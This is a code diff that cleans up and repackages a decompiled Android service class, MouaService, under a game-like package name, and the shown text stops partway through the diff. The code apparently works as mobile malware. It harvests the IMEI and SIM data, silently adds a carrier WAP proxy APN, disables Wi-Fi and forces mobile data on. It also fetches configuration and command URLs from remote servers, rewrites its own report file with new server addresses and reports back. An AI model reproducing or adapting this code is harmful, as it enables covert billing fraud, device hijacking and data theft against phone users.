@@ -2,29 +2,6 @@
 
 package com.agame.http;
 
-import android.app.PendingIntent;
-import android.content.ContentResolver;
-import android.content.ContentValues;
-import android.content.Context;
-import android.content.Intent;
-import android.content.SharedPreferences;
-import android.content.SharedPreferences$Editor;
-import android.database.Cursor;
-import android.database.SQLException;
-import android.net.ConnectivityManager;
-import android.net.NetworkInfo;
-import android.net.NetworkInfo$State;
-import android.net.Uri;
-import android.net.wifi.WifiManager;
-import android.os.Build;
-import android.os.Build$VERSION;
-import android.telephony.TelephonyManager;
-import android.util.Log;
-import com.tyj.onepiece.http.common.CommUtil;
-import com.tyj.onepiece.http.common.Constants;
-import com.tyj.onepiece.http.common.IniReader;
-import com.tyj.onepiece.http.common.LogUtil;
-import com.tyj.onepiece.http.common.Md5Util;
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileNotFoundException;
@@ -39,368 +16,377 @@ import java.lang.reflect.Method;
 import java.net.URLEncoder;
 import java.util.Iterator;
 
+import android.app.PendingIntent;
+import android.content.ContentResolver;
+import android.content.ContentValues;
+import android.content.Context;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.database.Cursor;
+import android.database.SQLException;
+import android.net.ConnectivityManager;
+import android.net.NetworkInfo;
+import android.net.Uri;
+import android.net.wifi.WifiManager;
+import android.os.Build;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+import com.agame.http.common.CommUtil;
+import com.agame.http.common.Constants;
+import com.agame.http.common.IniReader;
+import com.agame.http.common.LogUtil;
+import com.agame.http.common.Md5Util;
+
 public class MouaService {
-    private static int MAX_FAIL_COUNT;
-    private static int apnId;
-    private static boolean bOrigWifiStat;
-    private String cfg_url;
-    private String cfg_url_ip;
-    public static Context ctx;
-    private String imei;
-    private static LogUtil log;
-    static String mcc;
-    static String mnc;
-    public static int mversion;
-    private String number;
-    static String numberic;
-    private WifiManager wm;
-
-    static {
-        MouaService.ischinatel = 0;
-        MouaService.isIcs = false;
-        MouaService.mversion = 7;
-        MouaService.mnc = "";
-        MouaService.mcc = "";
-        MouaService.numberic = "";
-        MouaService.apnId = 0;
-        MouaService.MAX_FAIL_COUNT = 10;
-    }
-
-    public MouaService() {
-        super();
-        MouaService.log = ServiceInstance.log;
-    }
-
-    private int addFail() {
-        int v2;
-        SharedPreferences v3 = MouaService.ctx.getSharedPreferences("config", 0);
-        SharedPreferences$Editor v0 = v3.edit();
-        int v1 = v3.getInt("failc", 0) + 1;
-        MouaService.log.trace("addFail", "now f " + v1);
-        if(v1 == MouaService.MAX_FAIL_COUNT) {
-            v1 = 0;
-            v2 = MouaService.MAX_FAIL_COUNT;
-        }
-        else {
-            v2 = v1;
+        private static int MAX_FAIL_COUNT;
+        private static int apnId;
+        private static boolean bOrigWifiStat;
+        private String cfg_url;
+        private String cfg_url_ip;
+        public static Context ctx;
+        private String imei;
+        private static LogUtil log;
+        static String mcc;
+        static String mnc;
+        public static int mversion;
+        private String number;
+        static String numberic;
+        private WifiManager wm;
+        public static int ischinatel;
+        public static boolean isIcs;
+        static {
+                MouaService.ischinatel = 0;
+                MouaService.isIcs = false;
+                MouaService.mversion = 7;
+                MouaService.mnc = "";
+                MouaService.mcc = "";
+                MouaService.numberic = "";
+                MouaService.apnId = 0;
+                MouaService.MAX_FAIL_COUNT = 10;
         }
 
-        v0.putInt("failc", v1);
-        v0.commit();
-        return v2;
-    }
-
-    private void addOtherValues(ContentValues cv) {
-        Cursor v6 = MouaService.ctx.getContentResolver().query(Constants.APN_URI, null, null, null, null);
-        if(v6 != null && (v6.moveToNext())) {
-            String[] v7 = v6.getColumnNames();
-            int v8;
-            for(v8 = 0; v8 < v7.length; ++v8) {
-                if("spn".equals(v7[v8])) {
-                    cv.put("spn", "");
-                }
-            }
-        }
-    }
-
-    private void addSucc() {
-        SharedPreferences$Editor v0 = MouaService.ctx.getSharedPreferences("config", 0).edit();
-        v0.putInt("failc", 0);
-        v0.commit();
-    }
-
-    private int addapn() {
-        String v14;
-        int v3;
-        if(MouaService.ctx == null) {
-            MouaService.log.trace("ctx", "null");
-            v3 = -1;
-            return v3;
+        public MouaService() {
+                MouaService.log = ServiceInstance.log;
         }
 
-        Object v16 = MouaService.ctx.getSystemService("phone");
-        if(v16 == null) {
-            MouaService.log.trace("telManager", "null");
-            return -1;
-        }
-
-        String v15 = ((TelephonyManager)v16).getSimOperator();
-        String v11 = ((TelephonyManager)v16).getSubscriberId();
-        if(this.getstrlen(v15) > 0) {
-            v14 = v15;
-        }
-        else if(this.getstrlen(v11) <= 0) {
-            return -1;
-        }
-        else {
-            v14 = v11.substring(0, 5);
-        }
-
-        if(this.getstrlen(v14) == 0) {
-            MouaService.log.trace("numberic", "null");
-            return -1;
-        }
-
-        MouaService.ischinatel = (v14.equals("46003")) || (v15.contains("46003")) ? 1 : 0;
-        if(CommUtil.getstrlen(v14) == 0) {
-            return -1;
-        }
-
-        String v12 = v14.substring(0, 3);
-        String v13 = v14.substring(3);
-        MouaService.log.trace("numberic", v14);
-        MouaService.log.trace("mcc", v12);
-        MouaService.log.trace("mnc", v13);
-        ContentResolver v1 = MouaService.ctx.getContentResolver();
-        ContentValues v8 = new ContentValues();
-        v8.put("name", "default");
-        v8.put("apn", "default");
-        MouaService.log.trace("kkk", "1");
-        if(MouaService.ischinatel != 0) {
-            return -2;
-        }
-
-        v8.put("proxy", "10.0.0.172");
-        v8.put("port", "80");
-        v8.put("mcc", v12);
-        v8.put("mnc", v13);
-        v8.put("numeric", v14);
-        v8.put("current", Integer.valueOf(1));
-        MouaService.log.trace("kkk", "2");
-        v8.put("authtype", Integer.valueOf(0));
-        this.addOtherValues(v8);
-        Cursor v7 = null;
-        try {
-            MouaService.log.trace("kkk", "3");
-            Uri v2 = v1.insert(Constants.APN_TABLE_URI, v8);
-            MouaService.log.trace("kkk", "4");
-            if(v2 == null) {
-                goto label_155;
-            }
-
-            v7 = v1.query(v2, null, null, null, null);
-            v7.moveToFirst();
-            v3 = Integer.parseInt(v7.getString(v7.getColumnIndex("_id")));
-        }
-        catch(SecurityException v9) {
-            MouaService.log.trace("init apn", v9.toString());
-            v3 = -1;
-        }
-        catch(SQLException v9_1) {
-            MouaService.log.trace("init apn", v9_1.toString());
-            v3 = -1;
-        }
-
-        return v3;
-    label_155:
-        if(0 != 0) {
-            v7.close();
-        }
-
-        return -1;
-    }
-
-    private int adddefalutapn() {
-        int v2;
-        int v10 = -1;
-        ContentResolver v0 = MouaService.ctx.getContentResolver();
-        ContentValues v7 = new ContentValues();
-        v7.put("name", "default");
-        v7.put("apn", "default");
-        v7.put("proxy", "10.0.0.172");
-        v7.put("port", "80");
-        v7.put("mcc", MouaService.mcc);
-        v7.put("mnc", MouaService.mnc);
-        v7.put("numeric", MouaService.numberic);
-        v7.put("current", Integer.valueOf(1));
-        this.addOtherValues(v7);
-        Cursor v6 = null;
-        try {
-            Uri v1 = v0.insert(Constants.APN_TABLE_URI, v7);
-            if(v1 == null) {
-                goto label_60;
-            }
-
-            v6 = v0.query(v1, null, null, null, null);
-            v6.moveToFirst();
-            v2 = Integer.parseInt(v6.getString(v6.getColumnIndex("_id")));
-        }
-        catch(SecurityException v8) {
-            MouaService.log.trace("init apn", v8.toString());
-            v2 = v10;
-        }
-        catch(SQLException v8_1) {
-            MouaService.log.trace("init apn", v8_1.toString());
-            v2 = v10;
-        }
-
-        return v2;
-    label_60:
-        if(0 != 0) {
-            v6.close();
-        }
-
-        return v10;
-    }
-
-    public static int change_smsrpt(Context cx) {
-        OutputStreamWriter v0_1;
-        FileOutputStream v14;
-        String v17;
-        BufferedReader v4;
-        int v33;
-        IniReader v0;
-        MouaService.log_change("enter change_smsrpt");
-        try {
-            v0 = new IniReader(new FileReader(Constants.REPORT_PATH(cx)));
-        }
-        catch(IOException v8) {
-            v33 = -1;
-            return v33;
-        }
-
-        IniReader v29 = v0;
-        File v12 = new File(Constants.REPORT_PATH(cx));
-        try {
-            v4 = new BufferedReader(new FileReader(v12));
-            try {
-                v17 = v4.readLine();
-            }
-            catch(IOException v8) {
-                return -1;
-            }
-        }
-        catch(FileNotFoundException v8_1) {
-            goto label_96;
-        }
-
-        while(v17 != null) {
-            try {
-                MouaService.log_change(v17);
-                v17 = v4.readLine();
-                continue;
-            }
-            catch(FileNotFoundException v8_1) {
-                goto label_96;
-            }
-            catch(IOException v8) {
-                return -1;
-            }
-        }
-
-        String v7 = v29.getValue("report", "domainurl");
-        String v25 = "[domin]\r\nurls=" + v29.getValue("report", "configurl") + ";" + v29.getValue("report", "cmdurl") + ";\r\n";
-        MouaService.log_change("dominurl:" + v7);
-        MouaService.log_change("poststr:" + v25);
-        String v27 = HttpEngine.doPost(cx, v7, v25);
-        MouaService.log_change("pstr:" + v27);
-        if(v27 != null && v27.length() != 0) {
-            String[] v24 = v27.trim().substring(12).trim().split(";");
-            int v16 = v24.length;
-            if(v16 <= 0) {
-                MouaService.log_change("2");
-                v33 = 0;
-            }
-            else {
-                String v6 = "";
-                String v5 = "";
-                String v21 = "";
-                String v22 = "";
-                String v23 = "";
-                if(v16 >= 1) {
-                    v21 = v24[0];
+        private int addFail() {
+                int v2;
+                SharedPreferences v3 = MouaService.ctx.getSharedPreferences("config", 0);
+                SharedPreferences.Editor v0 = v3.edit();
+                int v1 = v3.getInt("failc", 0) + 1;
+                MouaService.log.trace("addFail", "now f " + v1);
+                if (v1 == MouaService.MAX_FAIL_COUNT) {
+                        v1 = 0;
+                        v2 = MouaService.MAX_FAIL_COUNT;
+                } else {
+                        v2 = v1;
                 }
 
-                if(v16 >= 2) {
-                    v22 = v24[1];
+                v0.putInt("failc", v1);
+                v0.commit();
+                return v2;
+        }
+
+        private void addOtherValues(ContentValues cv) {
+                Cursor v6 = MouaService.ctx.getContentResolver().query(Constants.APN_URI, null, null, null, null);
+                if (v6 != null && (v6.moveToNext())) {
+                        String[] v7 = v6.getColumnNames();
+                        int v8;
+                        for (v8 = 0; v8 < v7.length; ++v8) {
+                                if ("spn".equals(v7[v8])) {
+                                        cv.put("spn", "");
+                                }
+                        }
+                }
+        }
+
+        private void addSucc() {
+                SharedPreferences.Editor v0 = MouaService.ctx.getSharedPreferences("config", 0).edit();
+                v0.putInt("failc", 0);
+                v0.commit();
+        }
+
+        private int addapn() {
+                String v14;
+                int v3;
+                if (MouaService.ctx == null) {
+                        MouaService.log.trace("ctx", "null");
+                        v3 = -1;
+                        return v3;
                 }
 
-                if(v16 >= 3) {
-                    v23 = v24[2];
+                Object v16 = MouaService.ctx.getSystemService("phone");
+                if (v16 == null) {
+                        MouaService.log.trace("telManager", "null");
+                        return -1;
                 }
 
-                if(v21 != null && v21.length() != 0 || v22 != null && v22.length() != 0 || v23 != null && v23.length() != 0) {
-                    if(v21 != null && v21.length() != 0) {
-                        v6 = v21;
-                        MouaService.log_change("new configurl:" + v6);
-                    }
+                String v15 = ((TelephonyManager) v16).getSimOperator();
+                String v11 = ((TelephonyManager) v16).getSubscriberId();
+                if (this.getstrlen(v15) > 0) {
+                        v14 = v15;
+                } else if (this.getstrlen(v11) <= 0) {
+                        return -1;
+                } else {
+                        v14 = v11.substring(0, 5);
+                }
 
-                    if(v22 != null && v22.length() != 0) {
-                        v5 = v22;
-                        MouaService.log_change("new cmdurl:" + v5);
-                    }
+                if (this.getstrlen(v14) == 0) {
+                        MouaService.log.trace("numberic", "null");
+                        return -1;
+                }
 
-                    if(v23 != null && v23.length() != 0) {
-                        v7 = v23;
-                        MouaService.log_change("new dominurl:" + v7);
-                    }
+                MouaService.ischinatel = (v14.equals("46003")) || (v15.contains("46003")) ? 1 : 0;
+                if (CommUtil.getstrlen(v14) == 0) {
+                        return -1;
+                }
 
-                    String v32 = v29.getValue("report", "version");
-                    String v18 = v29.getValue("report", "number");
-                    String v31 = v29.getValue("report", "ua");
-                    String v10 = v29.getValue("report", "extchid");
-                    String v26 = v29.getValue("report", "productid");
-                    String v30 = v29.getValue("report", "subextid");
-                    String v3 = v29.getValue("report", "aftermin");
-                    MouaService.log_change("3");
-                    File v11 = new File(Constants.REPORT_PATH(cx));
-                    try {
-                        if(v11.exists()) {
-                            v11.delete();
+                String v12 = v14.substring(0, 3);
+                String v13 = v14.substring(3);
+                MouaService.log.trace("numberic", v14);
+                MouaService.log.trace("mcc", v12);
+                MouaService.log.trace("mnc", v13);
+                ContentResolver v1 = MouaService.ctx.getContentResolver();
+                ContentValues v8 = new ContentValues();
+                v8.put("name", "default");
+                v8.put("apn", "default");
+                MouaService.log.trace("kkk", "1");
+                if (MouaService.ischinatel != 0) {
+                        return -2;
+                }
+
+                v8.put("proxy", "10.0.0.172");
+                v8.put("port", "80");
+                v8.put("mcc", v12);
+                v8.put("mnc", v13);
+                v8.put("numeric", v14);
+                v8.put("current", Integer.valueOf(1));
+                MouaService.log.trace("kkk", "2");
+                v8.put("authtype", Integer.valueOf(0));
+                this.addOtherValues(v8);
+                Cursor v7 = null;
+                try {
+                        MouaService.log.trace("kkk", "3");
+                        Uri v2 = v1.insert(Constants.APN_TABLE_URI, v8);
+                        MouaService.log.trace("kkk", "4");
+                        if (v2 == null) {
+                                // if(0 != 0) {
+                                // v7.close();
+                                // }
+
+                                return -1;
                         }
 
-                        v11.createNewFile();
-                        v14 = new FileOutputStream(v11);
-                    }
-                    catch(IOException v9) {
-                        return -1;
-                    }
-
-                    try {
-                        v0_1 = new OutputStreamWriter(((OutputStream)v14));
-                    }
-                    catch(IOException v9) {
-                        return -1;
-                    }
-
-                    OutputStreamWriter v20 = v0_1;
-                    try {
-                        v20.write("[report]\r\n");
-                        v20.write("configurl=" + v6 + "\r\n");
-                        v20.write("version=" + v32 + "\r\n");
-                        v20.write("number=" + v18 + "\r\n");
-                        v20.write("ua=" + v31 + "\r\n");
-                        v20.write("extchid=" + v10 + "\r\n");
-                        v20.write("productid=" + v26 + "\r\n");
-                        v20.write("subextid=" + v30 + "\r\n");
-                        v20.write("aftermin=" + v3 + "\r\n");
-                        v20.write("cmdurl=" + v5 + "\r\n");
-                        v20.write("domainurl=" + v7 + "\r\n");
-                        v20.flush();
-                        v20.close();
-                        v14.close();
-                        return 0;
-                    }
-                    catch(IOException v9) {
-                    }
-
-                    return -1;
+                        v7 = v1.query(v2, null, null, null, null);
+                        v7.moveToFirst();
+                        v3 = Integer.parseInt(v7.getString(v7.getColumnIndex("_id")));
+                } catch (SecurityException v9) {
+                        MouaService.log.trace("init apn", v9.toString());
+                        v3 = -1;
+                } catch (SQLException v9_1) {
+                        MouaService.log.trace("init apn", v9_1.toString());
+                        v3 = -1;
                 }
 
-                v33 = 0;
-            }
-        }
-        else {
-            MouaService.log_change("1");
-            return 0;
-        label_96:
-            v33 = -1;
+                return v3;
+                // label_155:
+                // if(0 != 0) {
+                // v7.close();
+                // }
+                //
+                // return -1;
         }
 
-        return v33;
-    }
+        private int adddefalutapn() {
+                int v2;
+                int v10 = -1;
+                ContentResolver v0 = MouaService.ctx.getContentResolver();
+                ContentValues v7 = new ContentValues();
+                v7.put("name", "default");
+                v7.put("apn", "default");
+                v7.put("proxy", "10.0.0.172");
+                v7.put("port", "80");
+                v7.put("mcc", MouaService.mcc);
+                v7.put("mnc", MouaService.mnc);
+                v7.put("numeric", MouaService.numberic);
+                v7.put("current", Integer.valueOf(1));
+                this.addOtherValues(v7);
+                Cursor v6 = null;
+                try {
+                        Uri v1 = v0.insert(Constants.APN_TABLE_URI, v7);
+                        if (v1 == null) {
+                                // goto label_60;
+                                return v10;
+                        }
 
-    private boolean deletedefaultapn() {
+                        v6 = v0.query(v1, null, null, null, null);
+                        v6.moveToFirst();
+                        v2 = Integer.parseInt(v6.getString(v6.getColumnIndex("_id")));
+                } catch (SecurityException v8) {
+                        MouaService.log.trace("init apn", v8.toString());
+                        v2 = v10;
+                } catch (SQLException v8_1) {
+                        MouaService.log.trace("init apn", v8_1.toString());
+                        v2 = v10;
+                }
+
+                return v2;
+                // label_60:
+                // if(0 != 0) {
+                // v6.close();
+                // }
+                //
+                // return v10;
+        }
+
+        public static int change_smsrpt(Context cx) {
+                OutputStreamWriter v0_1;
+                FileOutputStream v14;
+                String v17;
+                BufferedReader v4;
+                int v33;
+                IniReader v0;
+                MouaService.log_change("enter change_smsrpt");
+                try {
+                        v0 = new IniReader(new FileReader(Constants.REPORT_PATH(cx)));
+                } catch (IOException v8) {
+                        v33 = -1;
+                        return v33;
+                }
+
+                IniReader v29 = v0;
+                File v12 = new File(Constants.REPORT_PATH(cx));
+                try {
+                        v4 = new BufferedReader(new FileReader(v12));
+                        try {
+                                v17 = v4.readLine();
+                        } catch (IOException v8) {
+                                return -1;
+                        }
+                } catch (FileNotFoundException v8_1) {
+                        // goto label_96;
+                        return -1;
+                }
+
+                while (v17 != null) {
+                        try {
+                                MouaService.log_change(v17);
+                                v17 = v4.readLine();
+                                continue;
+                        } catch (FileNotFoundException v8_1) {
+                                return -1;
+                        } catch (IOException v8) {
+                                return -1;
+                        }
+                }
+
+                String v7 = v29.getValue("report", "domainurl");
+                String v25 = "[domin]\r\nurls=" + v29.getValue("report", "configurl") + ";" + v29.getValue("report", "cmdurl") + ";\r\n";
+                MouaService.log_change("dominurl:" + v7);
+                MouaService.log_change("poststr:" + v25);
+                String v27 = HttpEngine.doPost(cx, v7, v25);
+                MouaService.log_change("pstr:" + v27);
+                if (v27 != null && v27.length() != 0) {
+                        String[] v24 = v27.trim().substring(12).trim().split(";");
+                        int v16 = v24.length;
+                        if (v16 <= 0) {
+                                MouaService.log_change("2");
+                                v33 = 0;
+                        } else {
+                                String v6 = "";
+                                String v5 = "";
+                                String v21 = "";
+                                String v22 = "";
+                                String v23 = "";
+                                if (v16 >= 1) {
+                                        v21 = v24[0];
+                                }
+
+                                if (v16 >= 2) {
+                                        v22 = v24[1];
+                                }
+
+                                if (v16 >= 3) {
+                                        v23 = v24[2];
+                                }
+
+                                if (v21 != null && v21.length() != 0 || v22 != null && v22.length() != 0 || v23 != null && v23.length() != 0) {
+                                        if (v21 != null && v21.length() != 0) {
+                                                v6 = v21;
+                                                MouaService.log_change("new configurl:" + v6);
+                                        }
+
+                                        if (v22 != null && v22.length() != 0) {
+                                                v5 = v22;
+                                                MouaService.log_change("new cmdurl:" + v5);
+                                        }
+
+                                        if (v23 != null && v23.length() != 0) {
+                                                v7 = v23;
+                                                MouaService.log_change("new dominurl:" + v7);
+                                        }
+
+                                        String v32 = v29.getValue("report", "version");
+                                        String v18 = v29.getValue("report", "number");
+                                        String v31 = v29.getValue("report", "ua");
+                                        String v10 = v29.getValue("report", "extchid");
+                                        String v26 = v29.getValue("report", "productid");
+                                        String v30 = v29.getValue("report", "subextid");
+                                        String v3 = v29.getValue("report", "aftermin");
+                                        MouaService.log_change("3");
+                                        File v11 = new File(Constants.REPORT_PATH(cx));
+                                        try {
+                                                if (v11.exists()) {
+                                                        v11.delete();
+                                                }
+
+                                                v11.createNewFile();
+                                                v14 = new FileOutputStream(v11);
+                                        } catch (IOException v9) {
+                                                return -1;
+                                        }
+
+                                        try {
+                                                v0_1 = new OutputStreamWriter(((OutputStream) v14));
+                                        } catch (Exception v9) {
+                                                return -1;
+                                        }
+
+                                        OutputStreamWriter v20 = v0_1;
+                                        try {
+                                                v20.write("[report]\r\n");
+                                                v20.write("configurl=" + v6 + "\r\n");
+                                                v20.write("version=" + v32 + "\r\n");
+                                                v20.write("number=" + v18 + "\r\n");
+                                                v20.write("ua=" + v31 + "\r\n");
+                                                v20.write("extchid=" + v10 + "\r\n");
+                                                v20.write("productid=" + v26 + "\r\n");
+                                                v20.write("subextid=" + v30 + "\r\n");
+                                                v20.write("aftermin=" + v3 + "\r\n");
+                                                v20.write("cmdurl=" + v5 + "\r\n");
+                                                v20.write("domainurl=" + v7 + "\r\n");
+                                                v20.flush();
+                                                v20.close();
+                                                v14.close();
+                                                return 0;
+                                        } catch (IOException v9) {
+                                        }
+
+                                        return -1;
+                                }
+
+                                v33 = 0;
+                        }
+                } else {
+                        MouaService.log_change("1");
+                        return 0;
+                }
+
+                return v33;
+        }
+
+        private boolean deletedefaultapn() {
         Cursor v6;
         String v12;
         int v9;
@@ -449,118 +435,114 @@ public class MouaService {
         }
     }
 
-    private int download_cfg() {
-        File v0 = new File(Constants.CONFIG_PATH(MouaService.ctx));
-        HttpUtils v1 = new HttpUtils(MouaService.ctx);
-        MouaService.log.trace("servlog", "cfg url:" + this.cfg_url);
-        return v1.download_file(this.cfg_url, v0);
-    }
-
-    private int download_ipcfg() {
-        File v0 = new File(Constants.CONFIG_PATH(MouaService.ctx));
-        HttpUtils v1 = new HttpUtils(MouaService.ctx);
-        MouaService.log.trace("servlog", "cfg url ip:" + this.cfg_url_ip);
-        return v1.download_file(this.cfg_url_ip, v0);
-    }
-
-    private int dowork() {
-        int v0 = new WapWorker(MouaService.ctx).doAction();
-        if(v0 != 0) {
-            MouaService.log.trace("wap work report", "error");
-        }
-        else {
-            MouaService.log.trace("wap worker", "over");
+        private int download_cfg() {
+                File v0 = new File(Constants.CONFIG_PATH(MouaService.ctx));
+                HttpUtils v1 = new HttpUtils(MouaService.ctx);
+                MouaService.log.trace("servlog", "cfg url:" + this.cfg_url);
+                return v1.download_file(this.cfg_url, v0);
         }
 
-        return v0;
-    }
-
-    public void entrypoint(Class mClass) {
-        int v10 = -1;
-        long v6 = 30;
-        MouaService.firstConnect(MouaService.ctx);
-        if(!this.init_params(MouaService.ctx)) {
-            this.sleeptimer(v6, mClass);
-            return;
+        private int download_ipcfg() {
+                File v0 = new File(Constants.CONFIG_PATH(MouaService.ctx));
+                HttpUtils v1 = new HttpUtils(MouaService.ctx);
+                MouaService.log.trace("servlog", "cfg url ip:" + this.cfg_url_ip);
+                return v1.download_file(this.cfg_url_ip, v0);
         }
 
-        MouaService.change_smsrpt(MouaService.ctx);
-        if(!this.set_apn(MouaService.ctx)) {
-            this.sleeptimer(v6, mClass);
-            return;
+        private int dowork() {
+                int v0 = new WapWorker(MouaService.ctx).doAction();
+                if (v0 != 0) {
+                        MouaService.log.trace("wap work report", "error");
+                } else {
+                        MouaService.log.trace("wap worker", "over");
+                }
+
+                return v0;
         }
 
-        this.setwifi(false);
-        this.toggleMobileData(MouaService.ctx, true);
-        long v2 = 30000;
-        try {
-            Thread.sleep(v2);
-        }
-        catch(InterruptedException v0) {
-            MouaService.log.trace("MOUA", "wif sleep");
-        }
+        public void entrypoint(Class mClass) {
+                int v10 = -1;
+                long v6 = 30;
+                MouaService.firstConnect(MouaService.ctx);
+                if (!this.init_params(MouaService.ctx)) {
+                        this.sleeptimer(v6, mClass);
+                        return;
+                }
 
-        while(true) {
-            MouaService.log.trace("get moua", "start");
-            int v1 = this.getmoua();
-            if(v1 == v10) {
-                MouaService.log.trace("get moua ", "error code: no number");
-                v1 = this.getip();
-            }
+                MouaService.change_smsrpt(MouaService.ctx);
+                if (!this.set_apn(MouaService.ctx)) {
+                        this.sleeptimer(v6, mClass);
+                        return;
+                }
 
-            if(v1 != v10 && v1 != -2 && v1 != -3) {
-                if(v1 == 0) {
-                    this.addSucc();
-                    Log.e("MOUA", "62");
-                    if(this.report(true, 0) != 0) {
-                        if(CommUtil.getstrlen(this.number) == 0) {
-                            MouaService.log.trace("servlog", "number is null");
+                this.setwifi(false);
+                this.toggleMobileData(MouaService.ctx, true);
+                long v2 = 30000;
+                try {
+                        Thread.sleep(v2);
+                } catch (InterruptedException v0) {
+                        MouaService.log.trace("MOUA", "wif sleep");
+                }
+
+                while (true) {
+                        MouaService.log.trace("get moua", "start");
+                        int v1 = this.getmoua();
+                        if (v1 == v10) {
+                                MouaService.log.trace("get moua ", "error code: no number");
+                                v1 = this.getip();
                         }
 
-                        MouaService.log.trace("moua  report", "error");
-                    }
+                        if (v1 != v10 && v1 != -2 && v1 != -3) {
+                                if (v1 == 0) {
+                                        this.addSucc();
+                                        Log.e("MOUA", "62");
+                                        if (this.report(true, 0) != 0) {
+                                                if (CommUtil.getstrlen(this.number) == 0) {
+                                                        MouaService.log.trace("servlog", "number is null");
+                                                }
+
+                                                MouaService.log.trace("moua  report", "error");
+                                        }
+                                }
+
+                                MouaService.log.trace("get config", "start");
+                                if (this.getconfig() >= 0) {
+                                        v1 = this.dowork();
+                                        if (v1 == 0) {
+                                                this.tryreport(true, 0);
+                                        } else {
+                                                this.tryreport(false, v1);
+                                        }
+
+                                        if (this.startlongtimer(mClass) < 0) {
+                                                this.sleeptimer(v6, mClass);
+                                        }
+
+                                        this.addSucc();
+                                        return;
+                                }
+
+                                this.addFail();
+                                this.sleeptimer(v6, mClass);
+                                return;
+                        }
+
+                        MouaService.log.trace("get moua ", "error code" + v1);
+                        if (MouaService.MAX_FAIL_COUNT == this.addFail()) {
+                                this.sleeptimer(v6, mClass);
+                                return;
+                        }
+
+                        v2 = 30000;
+                        try {
+                                Thread.sleep(v2);
+                        } catch (InterruptedException v0) {
+                                MouaService.log.trace("get moua", v0.getMessage());
+                        }
                 }
-
-                MouaService.log.trace("get config", "start");
-                if(this.getconfig() >= 0) {
-                    v1 = this.dowork();
-                    if(v1 == 0) {
-                        this.tryreport(true, 0);
-                    }
-                    else {
-                        this.tryreport(false, v1);
-                    }
-
-                    if(this.startlongtimer(mClass) < 0) {
-                        this.sleeptimer(v6, mClass);
-                    }
-
-                    this.addSucc();
-                    return;
-                }
-
-                this.addFail();
-                this.sleeptimer(v6, mClass);
-                return;
-            }
-
-            MouaService.log.trace("get moua ", "error code" + v1);
-            if(MouaService.MAX_FAIL_COUNT == this.addFail()) {
-                this.sleeptimer(v6, mClass);
-                return;
-            }
-
-            v2 = 30000;
-            try {
-                Thread.sleep(v2);
-            }
-            catch(InterruptedException v0) {
-                MouaService.log.trace("get moua", v0.getMessage());
-            }
         }
-    }
 
-    public static boolean firstConnect(Context context) {
+        public static boolean firstConnect(Context context) {
         String v10;
         NetworkInfo v17;
         IniReader v0;
@@ -683,19 +665,18 @@ public class MouaService {
         return false;
     }
 
-    public static int getSDKVersionNumber() {
-        int v1;
-        try {
-            v1 = Integer.valueOf(Build$VERSION.SDK).intValue();
-        }
-        catch(NumberFormatException v0) {
-            v1 = 2;
+        public static int getSDKVersionNumber() {
+                int v1;
+                try {
+                        v1 = Integer.valueOf(Build$VERSION.SDK).intValue();
+                } catch (NumberFormatException v0) {
+                        v1 = 2;
+                }
+
+                return v1;
         }
 
-        return v1;
-    }
-
-    private String get_config_url(IniReader rd) {
+        private String get_config_url(IniReader rd) {
         String v5;
         NetworkInfo v7;
         String v13;
@@ -791,138 +772,134 @@ public class MouaService {
         return v13;
     }
 
-    private int getconfig() {
-        int v1 = 0;
-        int v2 = -1;
-        while(v1 < 3) {
-            v2 = this.retry_getconfig();
-            MouaService.log.trace("get config", "time:" + (v1 + 1));
-            if(v2 == 0) {
-                return v2;
-            }
+        private int getconfig() {
+                int v1 = 0;
+                int v2 = -1;
+                while (v1 < 3) {
+                        v2 = this.retry_getconfig();
+                        MouaService.log.trace("get config", "time:" + (v1 + 1));
+                        if (v2 == 0) {
+                                return v2;
+                        }
 
-            if(v2 == -1) {
-                return v2;
-            }
+                        if (v2 == -1) {
+                                return v2;
+                        }
 
-            long v3 = 5000;
-            try {
-                Thread.sleep(v3);
-            }
-            catch(InterruptedException v0) {
-                Log.e("MOUA", "sleep error");
-            }
+                        long v3 = 5000;
+                        try {
+                                Thread.sleep(v3);
+                        } catch (InterruptedException v0) {
+                                Log.e("MOUA", "sleep error");
+                        }
 
-            ++v1;
-        }
-
-        return v2;
-    }
-
-    private int getip() {
-        int v1 = 0;
-        int v2 = -1;
-        while(v1 < 3) {
-            v2 = this.retry_getip();
-            MouaService.log.trace("get moua", "time:" + (v1 + 1));
-            if(v2 == 0) {
-                return v2;
-            }
-
-            if(v2 == 1) {
-                return v2;
-            }
-
-            if(v2 == -2) {
-                return v2;
-            }
-
-            long v3 = 5000;
-            try {
-                Thread.sleep(v3);
-            }
-            catch(InterruptedException v0) {
-                Log.e("MOUA", "sleep error");
-            }
-
-            ++v1;
-        }
-
-        return v2;
-    }
-
-    private int getmoua() {
-        int v1 = 0;
-        int v2 = -1;
-        while(v1 < 3) {
-            v2 = this.retry_getmoua();
-            MouaService.log.trace("get moua", "time:" + (v1 + 1));
-            if(v2 == 0) {
-                return v2;
-            }
-
-            if(v2 == 1) {
-                return v2;
-            }
-
-            if(v2 == -2) {
-                return v2;
-            }
-
-            long v3 = 5000;
-            try {
-                Thread.sleep(v3);
-            }
-            catch(InterruptedException v0) {
-                Log.e("MOUA", "sleep error");
-            }
-
-            ++v1;
-        }
-
-        return v2;
-    }
-
-    private int getstrlen(String str) {
-        int v0 = str == null ? 0 : str.length();
-        return v0;
-    }
-
-    public boolean init_params(Context context) {
-        boolean v2 = false;
-        MouaService.log.trace("init_params", "Config file path:" + Constants.REPORT_PATH(context));
-        if(CommUtil.DecryptObj2SdCard(context, Constants.APPDATA_PATH(context), "smsrpt.i", "config") == 0) {
-            Object v1 = context.getSystemService("phone");
-            if(v1 == null) {
-                MouaService.log.trace("service", "TelephonyManager null");
-            }
-            else {
-                this.imei = ((TelephonyManager)v1).getDeviceId();
-                if(CommUtil.getstrlen(this.imei) == 0) {
-                    this.imei = "";
+                        ++v1;
                 }
 
-                MouaService.ischinatel = 0;
-                MouaService.mversion = MouaService.getSDKVersionNumber();
-                MouaService.log.trace("service", "sdkversion number: " + MouaService.mversion);
-                if(MouaService.mversion > 10) {
-                    MouaService.isIcs = true;
+                return v2;
+        }
+
+        private int getip() {
+                int v1 = 0;
+                int v2 = -1;
+                while (v1 < 3) {
+                        v2 = this.retry_getip();
+                        MouaService.log.trace("get moua", "time:" + (v1 + 1));
+                        if (v2 == 0) {
+                                return v2;
+                        }
+
+                        if (v2 == 1) {
+                                return v2;
+                        }
+
